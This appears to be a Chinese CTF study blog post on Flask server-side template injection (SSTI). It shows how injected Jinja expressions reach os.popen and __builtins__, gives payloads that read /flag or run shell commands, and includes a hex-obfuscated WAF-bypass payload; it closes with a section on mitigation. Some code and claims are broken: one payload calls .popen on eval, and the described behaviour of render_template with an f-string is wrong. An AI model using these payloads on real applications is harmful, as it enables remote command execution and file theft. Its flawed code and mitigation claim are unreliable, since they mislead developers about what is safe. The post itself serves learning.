---
title: Python Flask 模板注入（SSTI）
createTime: 2025/09/28
permalink: /article/python-flask-ssti.html
contributors: 'Rainy'
tags:
  - CTF
  - Web
---

刚好做 CTF 碰到 SSTI，搜了一些资料学习一下，顺便做个笔记. ~~（其实是七月份写的但是当时刚好忙其他事情就断更了，当作补档吧）~~

## 漏洞描述

Flask 的模板渲染具有 `render_template_string` 方法，该方法允许通过变量包裹标识符 `{{ }}` 进行传参，由于该方法对于拼接的模板字符串会在渲染时运行，因此可以被用于**执行表达式**，例如对于：

```Python
@app.route('/test', methods=['POST'])
def index():
    name = request.form['name']
    str = f'hello {name}'
    return render_template_string(str)
```

如请求的 body 中 `name` 值为 `{{ 1+1 }}`，渲染结果将为 `hello 2`. 

## 利用思路

常见思路是，找到 `<class 'object'>` 父类 –> 寻找包括某些特殊方法的子类 –> 调用 `os` 模块实现读取文件/命令执行/...
例如（以下都基于 Python 3）：

```Python
>>> ''.__class__
<class 'str'>
>>> ''.__class__.__mro__
(<class 'str'>, <class 'object'>)
>>> ''.__class__.__mro__[1]
<class 'object'>
>>> ''.__class__.__mro__[1].__subclasses__()
[<class 'type'>, <class 'async_generator'>, <class 'bytearray_iterator'>, <class 'bytearray'>, <class 'bytes_iterator'>, <class 'bytes'>, <class 'builtin_function_or_method'>, <class 'callable_iterator'>, <class 'PyCapsule'>, <class 'cell'>, <class 'classmethod_descriptor'>, <class 'classmethod'>, <class 'code'>, <class 'complex'>, <class '_contextvars.Token'>, <class '_contextvars.ContextVar'>, <class '_contextvars.Context'>, <class 'coroutine'>, <class 'dict_items'>, <class 'dict_itemiterator'>, <class 'dict_keyiterator'>, <class 'dict_valueiterator'>, <class 'dict_keys'>, <class 'mappingproxy'>, <class 'dict_reverseitemiterator'>, <class 'dict_reversekeyiterator'>, <class 'dict_reversevalueiterator'>, <class 'dict_values'>, <class 'dict'>, <class 'ellipsis'>, <class 'enumerate'>, <class 'filter'>, <class 'float'>, <class 'frame'>, <class 'frozenset'>, <class 'function'>, <class 'generator'>, <class 'getset_descriptor'>, <class 'instancemethod'>, <class 'list_iterator'>, <class 'list_reverseiterator'>, <class 'list'>, <class 'longrange_iterator'>, <class 'int'>, <class 'map'>, <class 'member_descriptor'>, <class 'memoryview'>, <class 'method_descriptor'>, <class 'method'>, <class 'moduledef'>, <class 'module'>, <class 'odict_iterator'>, <class 'pickle.PickleBuffer'>, <class 'property'>, <class 'range_iterator'>, <class 'range'>, <class 'reversed'>, <class 'symtable entry'>, <class 'iterator'>, <class 'set_iterator'>, <class 'set'>, <class 'slice'>, <class 'staticmethod'>, <class 'stderrprinter'>, <class 'super'>, <class 'traceback'>, <class 'tuple_iterator'>, <class 'tuple'>, <class 'str_iterator'>, <class 'str'>, <class 'wrapper_descriptor'>, <class 'zip'>, <class 'types.GenericAlias'>, <class 'anext_awaitable'>, <class 'async_generator_asend'>, <class 'async_generator_athrow'>, <class 'async_generator_wrapped_value'>, <class '_buffer_wrapper'>, <class 'Token.MISSING'>, <class 'coroutine_wrapper'>, <class 'generic_alias_iterator'>, <class 'items'>, <class 'keys'>, <class 'values'>, <class 'hamt_array_node'>, <class 'hamt_bitmap_node'>, <class 'hamt_collision_node'>, <class 'hamt'>, <class 'sys.legacy_event_handler'>, <class 'InterpreterID'>, <class 'line_iterator'>, <class 'managedbuffer'>, <class 'memory_iterator'>, <class 'method-wrapper'>, <class 'types.SimpleNamespace'>, <class 'NoneType'>, <class 'NotImplementedType'>, <class 'positions_iterator'>, <class 'str_ascii_iterator'>, <class 'types.UnionType'>, <class 'weakref.CallableProxyType'>, <class 'weakref.ProxyType'>, <class 'weakref.ReferenceType'>, <class 'typing.TypeAliasType'>, <class 'typing.Generic'>, <class 'typing.TypeVar'>, <class 'typing.TypeVarTuple'>, <class 'typing.ParamSpec'>, <class 'typing.ParamSpecArgs'>, <class 'typing.ParamSpecKwargs'>, <class 'EncodingMap'>, <class 'fieldnameiterator'>, <class 'formatteriterator'>, <class 'BaseException'>, <class '_frozen_importlib._WeakValueDictionary'>, <class '_frozen_importlib._BlockingOnManager'>, <class '_frozen_importlib._ModuleLock'>, <class '_frozen_importlib._DummyModuleLock'>, <class '_frozen_importlib._ModuleLockManager'>, <class '_frozen_importlib.ModuleSpec'>, <class '_frozen_importlib.BuiltinImporter'>, <class '_frozen_importlib.FrozenImporter'>, <class '_frozen_importlib._ImportLockContext'>, <class '_thread.lock'>, <class '_thread.RLock'>, <class '_thread._localdummy'>, <class '_thread._local'>, <class '_io.IncrementalNewlineDecoder'>, <class '_io._BytesIOBuffer'>, <class '_io._IOBase'>, <class 'posix.ScandirIterator'>, <class 'posix.DirEntry'>, <class '_frozen_importlib_external.WindowsRegistryFinder'>, <class '_frozen_importlib_external._LoaderBasics'>, <class '_frozen_importlib_external.FileLoader'>, <class '_frozen_importlib_external._NamespacePath'>, <class '_frozen_importlib_external.NamespaceLoader'>, <class '_frozen_importlib_external.PathFinder'>, <class '_frozen_importlib_external.FileFinder'>, <class 'codecs.Codec'>, <class 'codecs.IncrementalEncoder'>, <class 'codecs.IncrementalDecoder'>, <class 'codecs.StreamReaderWriter'>, <class 'codecs.StreamRecoder'>, <class '_abc._abc_data'>, <class 'abc.ABC'>, <class 'collections.abc.Hashable'>, <class 'collections.abc.Awaitable'>, <class 'collections.abc.AsyncIterable'>, <class 'collections.abc.Iterable'>, <class 'collections.abc.Sized'>, <class 'collections.abc.Container'>, <class 'collections.abc.Buffer'>, <class 'collections.abc.Callable'>, <class 'genericpath.ALLOW_MISSING'>, <class 'os._wrap_close'>, <class '_sitebuiltins.Quitter'>, <class '_sitebuiltins._Printer'>, <class '_sitebuiltins._Helper'>, <class '_distutils_hack._TrivialRe'>, <class '_distutils_hack.DistutilsMetaFinder'>, <class '_distutils_hack.shim'>, <class 'types.DynamicClassAttribute'>, <class 'types._GeneratorWrapper'>, <class 'warnings.WarningMessage'>, <class 'warnings.catch_warnings'>, <class 'importlib._abc.Loader'>, <class 'itertools.accumulate'>, <class 'itertools.batched'>, <class 'itertools.chain'>, <class 'itertools.combinations'>, <class 'itertools.compress'>, <class 'itertools.count'>, <class 'itertools.combinations_with_replacement'>, <class 'itertools.cycle'>, <class 'itertools.dropwhile'>, <class 'itertools.filterfalse'>, <class 'itertools.groupby'>, <class 'itertools._grouper'>, <class 'itertools.islice'>, <class 'itertools.pairwise'>, <class 'itertools.permutations'>, <class 'itertools.product'>, <class 'itertools.repeat'>, <class 'itertools.starmap'>, <class 'itertools.takewhile'>, <class 'itertools._tee'>, <class 'itertools._tee_dataobject'>, <class 'itertools.zip_longest'>, <class 'operator.attrgetter'>, <class 'operator.itemgetter'>, <class 'operator.methodcaller'>, <class 'reprlib.Repr'>, <class 'collections.deque'>, <class 'collections._deque_iterator'>, <class 'collections._deque_reverse_iterator'>, <class 'collections._tuplegetter'>, <class 'collections._Link'>, <class 'functools.partial'>, <class 'functools._lru_cache_wrapper'>, <class 'functools.KeyWrapper'>, <class 'functools._lru_list_elem'>, <class 'functools.partialmethod'>, <class 'functools.singledispatchmethod'>, <class 'functools.cached_property'>, <class '_weakrefset._IterationGuard'>, <class '_weakrefset.WeakSet'>, <class 'threading._RLock'>, <class 'threading.Condition'>, <class 'threading.Semaphore'>, <class 'threading.Event'>, <class 'threading.Barrier'>, <class 'threading.Thread'>, <class 'importlib.util._incompatible_extension_module_restrictions'>, <class 'enum.nonmember'>, <class 'enum.member'>, <class 'enum._not_given'>, <class 'enum._auto_null'>, <class 'enum.auto'>, <class 'enum._proto_member'>, <enum 'Enum'>, <class 'enum.verify'>, <class 're.Pattern'>, <class 're.Match'>, <class '_sre.SRE_Scanner'>, <class '_sre.SRE_Template'>, <class 're._parser.State'>, <class 're._parser.SubPattern'>, <class 're._parser.Tokenizer'>, <class 're.Scanner'>, <class 'ast.AST'>, <class 'contextlib.ContextDecorator'>, <class 'contextlib.AsyncContextDecorator'>, <class 'contextlib._GeneratorContextManagerBase'>, <class 'contextlib._BaseExitStack'>, <class 'ast.NodeVisitor'>, <class 'dis._Unknown'>, <class 'dis.Bytecode'>, <class '_tokenize.TokenizerIter'>, <class 'tokenize.Untokenizer'>, <class 'inspect.BlockFinder'>, <class 'inspect._void'>, <class 'inspect._empty'>, <class 'inspect.Parameter'>, <class 'inspect.BoundArguments'>, <class 'inspect.Signature'>, <class 'rlcompleter.Completer'>, <class 'textwrap.TextWrapper'>, <class 'traceback._Sentinel'>, <class 'traceback.FrameSummary'>, <class 'traceback._ExceptionPrintContext'>, <class 'traceback.TracebackException'>, <class 'gettext.NullTranslations'>, <class 'typing._Final'>, <class 'typing._NotIterable'>, typing.Any, <class 'typing._PickleUsingNameMixin'>, <class 'typing._TypingEllipsis'>, <class 'typing.Annotated'>, <class 'typing.NamedTuple'>, <class 'typing.TypedDict'>, <class 'typing.NewType'>, <class 'typing.io'>, <class 'typing.re'>, <class 'platform._Processor'>, <class 'select.poll'>, <class 'select.epoll'>, <class 'selectors.BaseSelector'>, <class 'subprocess.CompletedProcess'>, <class 'subprocess.Popen'>, <class 'apport.packaging.PackageInfo'>, <class '__future__._Feature'>, <class 'datetime.date'>, <class 'datetime.time'>, <class 'datetime.timedelta'>, <class 'datetime.tzinfo'>, <class '_struct.Struct'>, <class '_struct.unpack_iterator'>, <class 'zlib.Compress'>, <class 'zlib.Decompress'>, <class 'zlib._ZlibDecompressor'>, <class 'gzip._PaddedFile'>, <class '_hashlib.HASH'>, <class '_hashlib.HMAC'>, <class '_blake2.blake2b'>, <class '_blake2.blake2s'>, <class 'string.Template'>, <class 'string.Formatter'>, <class 'email.charset.Charset'>, <class 'email.header.Header'>, <class 'email.header._ValueFormatter'>, <class '_random.Random'>, <class '_sha2.SHA224Type'>, <class '_sha2.SHA256Type'>, <class '_sha2.SHA384Type'>, <class '_sha2.SHA512Type'>, <class '_socket.socket'>, <class 'socket.AddressFamily'>, <class 'array.array'>, <class 'array.arrayiterator'>, <class 'ipaddress._IPAddressBase'>, <class 'ipaddress._BaseConstants'>, <class 'ipaddress._BaseV4'>, <class 'ipaddress._IPv4Constants'>, <class 'ipaddress._BaseV6'>, <class 'ipaddress._IPv6Constants'>, <class 'urllib.parse._ResultMixinStr'>, <class 'urllib.parse._ResultMixinBytes'>, <class 'urllib.parse._NetlocResultMixinBase'>, <class 'calendar._localized_month'>, <class 'calendar._localized_day'>, <class 'calendar.Calendar'>, <class 'calendar.different_locale'>, <class 'email._parseaddr.AddrlistClass'>, <class 'email._policybase._PolicyBase'>, <class 'email.feedparser.BufferedSubFile'>, <class 'email.feedparser.FeedParser'>, <class 'email.parser.Parser'>, <class 'email.parser.BytesParser'>, <class 'email.message.Message'>, <class 'http.client.HTTPConnection'>, <class '_ssl._SSLContext'>, <class '_ssl._SSLSocket'>, <class '_ssl.MemoryBIO'>, <class '_ssl.SSLSession'>, <class '_ssl.Certificate'>, <class 'ssl.SSLObject'>, <class '_json.Scanner'>, <class '_json.Encoder'>, <class 'json.decoder.JSONDecoder'>, <class 'json.encoder.JSONEncoder'>, <class 'weakref.finalize._Info'>, <class 'weakref.finalize'>, <class 'logging.LogRecord'>, <class 'logging.PercentStyle'>, <class 'logging.Formatter'>, <class 'logging.BufferingFormatter'>, <class 'logging.Filter'>, <class 'logging.Filterer'>, <class 'logging.PlaceHolder'>, <class 'logging.Manager'>, <class 'logging.LoggerAdapter'>, <class 'pathlib._Selector'>, <class 'pathlib._TerminatingSelector'>, <class 'pathlib.PurePath'>, <class '_pickle.Pdata'>, <class '_pickle.PicklerMemoProxy'>, <class '_pickle.UnpicklerMemoProxy'>, <class '_pickle.Pickler'>, <class '_pickle.Unpickler'>, <class 'pickle._Framer'>, <class 'pickle._Unframer'>, <class 'pickle._Pickler'>, <class 'pickle._Unpickler'>, <class '_bz2.BZ2Compressor'>, <class '_bz2.BZ2Decompressor'>, <class '_lzma.LZMACompressor'>, <class '_lzma.LZMADecompressor'>, <class 'tempfile._RandomNameSequence'>, <class 'tempfile._TemporaryFileCloser'>, <class 'tempfile._TemporaryFileWrapper'>, <class 'tempfile.TemporaryDirectory'>, <class 'urllib.request.Request'>, <class 'urllib.request.OpenerDirector'>, <class 'urllib.request.BaseHandler'>, <class 'urllib.request.HTTPPasswordMgr'>, <class 'urllib.request.AbstractBasicAuthHandler'>, <class 'urllib.request.AbstractDigestAuthHandler'>, <class 'urllib.request.URLopener'>, <class 'urllib.request.ftpwrapper'>, <class 'apt_pkg.Configuration'>, <class 'pkgCacheFile'>, <class 'apt_pkg.TagSection'>, <class 'apt_pkg.TagFile'>, <class 'apt_pkg.Tag'>, <class 'apt_pkg.Acquire'>, <class 'apt_pkg.AcquireItem'>, <class 'apt_pkg.AcquireWorker'>, <class 'apt_pkg.Cache'>, <class 'apt_pkg.Dependency'>, <class 'apt_pkg.Description'>, <class 'apt_pkg.PackageFile'>, <class 'apt_pkg.PackageList'>, <class 'apt_pkg.DependencyList'>, <class 'apt_pkg.Package'>, <class 'apt_pkg.Version'>, <class 'apt_pkg.Group'>, <class 'apt_pkg.GroupList'>, <class 'apt_pkg.Cdrom'>, <class 'apt_pkg.ActionGroup'>, <class 'apt_pkg.DepCache'>, <class 'apt_pkg.ProblemResolver'>, <class 'apt_pkg.IndexFile'>, <class 'apt_pkg.MetaIndex'>, <class 'apt_pkg._PackageManager'>, <class 'apt_pkg.PackageRecords'>, <class 'apt_pkg.SourceRecords'>, <class 'apt_pkg.SourceRecordFiles'>, <class 'apt_pkg.SourceList'>, <class 'apt_pkg.HashString'>, <class 'apt_pkg.Policy'>, <class 'apt_pkg.Hashes'>, <class 'apt_pkg.AcquireItemDesc'>, <class 'apt_pkg.SystemLock'>, <class 'apt_pkg.FileLock'>, <class 'apt_pkg.OrderList'>, <class 'apt_pkg.HashStringList'>, <class 'apt.progress.base.AcquireProgress'>, <class 'apt.progress.base.CdromProgress'>, <class 'apt.progress.base.InstallProgress'>, <class 'apt.progress.base.OpProgress'>, <class 'apt.progress.text.TextProgress'>, <class 'apt.package.BaseDependency'>, <class 'apt.package.Origin'>, <class 'apt.package.Version'>, <class 'apt.package.Package'>, <class 'apt.cache._WrappedLock'>, <class 'apt.cache.Cache'>, <class 'apt.cache.ProblemResolver'>, <class 'apt.cache.Filter'>, <class 'apt.cache._FilteredCacheHelper'>, <class 'apt.cache.FilteredCache'>, <class 'aptsources._deb822.Section'>, <class 'aptsources._deb822.File'>, <class '_csv.Dialect'>, <class '_csv.reader'>, <class '_csv.writer'>, <class 'csv.Dialect'>, <class 'csv.DictReader'>, <class 'csv.DictWriter'>, <class 'csv.Sniffer'>, <class 'aptsources.distinfo.Template'>, <class 'aptsources.distinfo.Component'>, <class 'aptsources.distinfo.Mirror'>, <class 'aptsources.distinfo.Repository'>, <class 'aptsources.distinfo.DistInfo'>, <class 'aptsources.sourceslist.Deb822SourceEntry'>, <class 'aptsources.sourceslist.ExplodedDeb822SourceEntry'>, <class 'aptsources.sourceslist.SourceEntry'>, <class 'aptsources.sourceslist.NullMatcher'>, <class 'aptsources.sourceslist.SourcesList'>, <class 'aptsources.sourceslist.SourceEntryMatcher'>, <class 'xml.dom.Node'>, <class 'xml.dom.UserDataHandler'>, <class 'xml.dom.NodeFilter.NodeFilter'>, <class 'xml.dom.xmlbuilder.Options'>, <class 'xml.dom.xmlbuilder.DOMBuilder'>, <class 'xml.dom.xmlbuilder.DOMEntityResolver'>, <class 'xml.dom.xmlbuilder.DOMInputSource'>, <class 'xml.dom.xmlbuilder.DOMBuilderFilter'>, <class 'xml.dom.xmlbuilder.DocumentLS'>, <class 'xml.dom.xmlbuilder.DOMImplementationLS'>, <class 'xml.dom.minidom.NamedNodeMap'>, <class 'xml.dom.minidom.TypeInfo'>, <class 'xml.dom.minidom.Childless'>, <class 'xml.dom.minidom.ReadOnlySequentialNamedNodeMap'>, <class 'xml.dom.minidom.Identified'>, <class 'xml.dom.minidom.ElementInfo'>, <class 'pyexpat.xmlparser'>, <class 'configparser.Interpolation'>, <class 'dataclasses._HAS_DEFAULT_FACTORY_CLASS'>, <class 'dataclasses._MISSING_TYPE'>, <class 'dataclasses._KW_ONLY_TYPE'>, <class 'dataclasses._FIELD_BASE'>, <class 'dataclasses.InitVar'>, <class 'dataclasses.Field'>, <class 'dataclasses._DataclassParams'>, <class 'email.headerregistry.Address'>, <class 'email.headerregistry.Group'>, <class 'email.headerregistry.UnstructuredHeader'>, <class 'email.headerregistry.DateHeader'>, <class 'email.headerregistry.AddressHeader'>, <class 'email.headerregistry.MIMEVersionHeader'>, <class 'email.headerregistry.ParameterizedMIMEHeader'>, <class 'email.headerregistry.ContentTransferEncodingHeader'>, <class 'email.headerregistry.MessageIDHeader'>, <class 'email.headerregistry.HeaderRegistry'>, <class 'email.contentmanager.ContentManager'>, <class 'problem_report.CompressedFile'>, <class 'problem_report.CompressedValue'>, <class 'argparse._AttributeHolder'>, <class 'argparse.HelpFormatter._Section'>, <class 'argparse.HelpFormatter'>, <class 'argparse.FileType'>, <class 'argparse._ActionsContainer'>, <class '_queue.SimpleQueue'>, <class 'queue.Queue'>, <class 'queue._PySimpleQueue'>, <class 'email.generator.Generator'>, <class 'hmac.HMAC'>, <class 'smtplib.SMTP'>, <class 'shlex.shlex'>, <class 'webbrowser.BaseBrowser'>, <class 'apport.crashdb.CrashDatabase'>, <class 'apport.user_group.UserGroupID'>, <class 'apport.ui.Action'>, <class 'apport.ui.UserInterface'>, <class 'apport.ui.HookUI'>]
```

我们的目标是调用 `os` 模块，为此可以执行：

```Python
#encoding: utf-8
num = 0
for item in ''.__class__.__mro__[1].__subclasses__():
    try:
        if 'os' in item.__init__.__globals__:
            print(num)
            print(item)
        num += 1
    except:
        num += 1
```

可以拿到：

```Python
159
<class '_distutils_hack._TrivialRe'>
```

然后调用：

```Python
>>> ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('ls').read()
```

`popen`后面填写需要执行的命令，同理也可以利用 `__builtins__` 的 `eval` 模块：

```Python
# 修改前述代码查找包含 __builtins__ 的类
114
<class '_frozen_importlib._WeakValueDictionary'>
115
<class '_frozen_importlib._BlockingOnManager'>
116
<class '_frozen_importlib._ModuleLock'>
117
<class '_frozen_importlib._DummyModuleLock'>
118
<class '_frozen_importlib._ModuleLockManager'>
119
<class '_frozen_importlib.ModuleSpec'>
134
<class '_frozen_importlib_external.FileLoader'>
135
<class '_frozen_importlib_external._NamespacePath'>
136
<class '_frozen_importlib_external.NamespaceLoader'>
138
<class '_frozen_importlib_external.FileFinder'>
140
<class 'codecs.IncrementalEncoder'>
141
<class 'codecs.IncrementalDecoder'>
142
<class 'codecs.StreamReaderWriter'>
143
<class 'codecs.StreamRecoder'>
155
<class 'os._wrap_close'>
156
<class '_sitebuiltins.Quitter'>
157
<class '_sitebuiltins._Printer'>
159
<class '_distutils_hack._TrivialRe'>
162
<class 'types.DynamicClassAttribute'>
163
<class 'types._GeneratorWrapper'>
164
<class 'warnings.WarningMessage'>
165
<class 'warnings.catch_warnings'>
192
<class 'reprlib.Repr'>
203
<class 'functools.partialmethod'>
204
<class 'functools.singledispatchmethod'>
205
<class 'functools.cached_property'>
206
<class '_weakrefset._IterationGuard'>
207
<class '_weakrefset.WeakSet'>
208
<class 'threading._RLock'>
209
<class 'threading.Condition'>
210
<class 'threading.Semaphore'>
211
<class 'threading.Event'>
212
<class 'threading.Barrier'>
213
<class 'threading.Thread'>
214
<class 'importlib.util._incompatible_extension_module_restrictions'>

>>> ''.__class__.__mro__[1].__subclasses__()[114].__init__.__globals__['__builtins__']['eval'].popen('cat /flag').read()
```

## 漏洞利用

所以，要读取 `/flag`，传递的参数可以是：

```Python
{{ ''.__class__.__mro__[1].__subclasses__()[159].__init__.__globals__['os'].popen('cat /flag').read() }}
```

或者：

```Python
{{ ''.__class__.__mro__[1].__subclasses__()[114].__init__.__globals__['__builtins__']['eval'].popen('cat /flag').read() }}
```

只需读取文件的话这样也可以：

```Python
{{ ''.__class__.__mro__[1].__subclasses__()[114].__init__.__globals__['__builtins__']['open']('/flag').read() }}
```

当然也可以不以 `str` 类型作为起点：

```Python
{{ ().__class__.__bases__[0].__subclasses__()[114].__init__.__globals__['__builtins__']['open']('/flag').read() }}
```

另外，这里也可以根据具体的环境权限构造 payload 实现反弹 shell. 

### 混淆绕过

有的环境下 WAF 可能对 url 请求传参会做过滤，例如题 [python ssti2](https://ctf.xidian.edu.cn/training/11?challenge=690) 就不允许请求参数中携带包括以下关键字的内容：\_\_, builtin, globals, app, url_for, get_flashed_messages, ilipsum, init, os.

要绕过关键字筛选，可以通过 `+` 和 `""` 进行拼接，再结合十六进制，拿到：

```Python
{{ ''["\x5f\x5fclass\x5f\x5f"]["\x5f\x5fmro\x5f\x5f"][1]["\x5f\x5fsubclasses\x5f\x5f"]()[114]["\x5f\x5fin"+"it\x5f\x5f"]["\x5f\x5fglo"+"bals\x5f\x5f"]["\x5f\x5fbui"+"ltins\x5f\x5f"]["\x5f\x5fimport\x5f\x5f"]('o'+'s')["popen"]("cat /flag")["read"]() }}
```

## 进一步探讨：安全改进

要避免上述问题，网上的文章一般会提到使用 `render_template` 方法替代. 例如对于：

```Python
@app.route('/test', methods=['POST'])
def index():
    name = request.form['name']
    str = f'hello {name}'
    return render_template(str)
```

若请求 body 中 `name` 值为 `{{ 1+1 }}`，渲染结果将为 `hello {{ 1+1 }}` .

### 为什么这两个方法渲染结果不同

翻阅 Flask 关于这两个方法实现的源代码（[templating.py](https://github.com/pallets/flask/blob/main/src/flask/templating.py)），`render_template` 和 `render_template_string` 方法分别是基于 jinja ~~（这个名字总让人想到 Chromium 新的构建工具 ninja）~~ 的 `get_or_select_template` 和 `from_string` 方法实现的，根据 [jinja 的文档](https://jinja.palletsprojects.com/en/stable/api/)，`from_string` 方法 without using **loader**.

## 参考

- [python-flask 模块注入(SSTI)
  ](https://www.cnblogs.com/-chenxs/p/11971164.html)
- [【WEB】SSTI | 狼组安全团队公开知识库](https://wiki.wgpsec.org/knowledge/ctf/SSTI.html)
